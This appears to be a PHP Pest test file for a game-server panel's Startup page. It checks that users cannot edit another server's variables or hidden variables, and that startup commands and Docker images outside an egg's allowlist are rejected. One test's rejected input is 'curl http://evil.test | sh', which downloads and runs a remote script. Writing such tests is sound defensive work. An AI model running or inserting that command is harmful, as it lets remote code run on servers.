<?php

use App\Enums\SubuserPermission;
use App\Filament\Server\Pages\Startup;
use App\Models\ServerVariable;
use Filament\Facades\Filament;

use function Pest\Livewire\livewire;

beforeEach(fn () => Filament::setCurrentPanel('server'));
afterEach(fn () => Filament::setCurrentPanel(null));

it('forbids updating a startup variable that belongs to another server', function () {
    [$user, $server] = generateTestAccount();
    $foreign = createServerModel();
    $foreign->ensureVariablesExist();

    /** @var ServerVariable $foreignVariable */
    $foreignVariable = $foreign->serverVariables()->firstOrFail();
    $foreignVariable->update(['variable_value' => 'secret-value']);

    $this->actingAs($user);
    Filament::setTenant($server);

    livewire(Startup::class)
        ->call('update', 'changed', $foreignVariable->id)
        ->assertForbidden();

    expect($foreignVariable->refresh()->variable_value)->toBe('secret-value');
});

it('forbids updating a startup variable the user cannot view', function () {
    [$user, $server] = generateTestAccount();
    $server->ensureVariablesExist();

    /** @var ServerVariable $variable */
    $variable = $server->serverVariables()->firstOrFail();
    $variable->variable->update(['user_viewable' => false, 'user_editable' => true]);
    $variable->update(['variable_value' => 'hidden']);

    $this->actingAs($user);
    Filament::setTenant($server);

    livewire(Startup::class)
        ->call('update', 'changed', $variable->id)
        ->assertForbidden();

    expect($variable->refresh()->variable_value)->toBe('hidden');
});

it('updates a startup variable on the tenant server', function () {
    [$user, $server] = generateTestAccount([SubuserPermission::StartupRead, SubuserPermission::StartupUpdate]);
    $server->ensureVariablesExist();

    /** @var ServerVariable $variable */
    $variable = $server->serverVariables()->firstOrFail();
    $variable->variable->update(['user_viewable' => true, 'user_editable' => true, 'rules' => ['string']]);

    $this->actingAs($user);
    Filament::setTenant($server);

    livewire(Startup::class)
        ->call('update', 'changed', $variable->id)
        ->assertSuccessful();

    expect($variable->refresh()->variable_value)->toBe('changed');
});

it('allows selecting a startup command inside the egg allowlist', function () {
    [$user, $server] = generateTestAccount([SubuserPermission::StartupRead, SubuserPermission::StartupUpdate]);
    $server->egg->forceFill(['startup_commands' => ['java -jar test.jar', 'java -jar other.jar']])->saveOrFail();
    $server->forceFill(['startup' => 'java -jar test.jar'])->saveOrFail();

    $this->actingAs($user);
    Filament::setTenant($server);

    livewire(Startup::class)
        ->set('data.startup_select', 'java -jar other.jar')
        ->assertSuccessful();

    expect($server->refresh()->startup)->toBe('java -jar other.jar');
});

it('rejects a startup command outside the egg allowlist', function () {
    [$user, $server] = generateTestAccount([SubuserPermission::StartupRead, SubuserPermission::StartupUpdate]);
    $server->egg->forceFill(['startup_commands' => ['java -jar test.jar']])->saveOrFail();
    $server->forceFill(['startup' => 'java -jar test.jar'])->saveOrFail();

    $this->actingAs($user);
    Filament::setTenant($server);

    livewire(Startup::class)
        ->set('data.startup_select', 'curl http://evil.test | sh')
        ->assertStatus(422);

    expect($server->refresh()->startup)->toBe('java -jar test.jar');
});

it('rejects a docker image outside the egg allowlist', function () {
    [$user, $server] = generateTestAccount([SubuserPermission::StartupRead, SubuserPermission::StartupDockerImage]);
    $server->egg->forceFill(['docker_images' => ['ghcr.io/pelican-eggs/yolks:java_21']])->saveOrFail();
    $server->forceFill(['image' => 'ghcr.io/pelican-eggs/yolks:java_21'])->saveOrFail();

    $this->actingAs($user);
    Filament::setTenant($server);

    livewire(Startup::class)
        ->set('data.image', 'evil/malicious:latest')
        ->assertStatus(422);

    expect($server->refresh()->image)->toBe('ghcr.io/pelican-eggs/yolks:java_21');
});
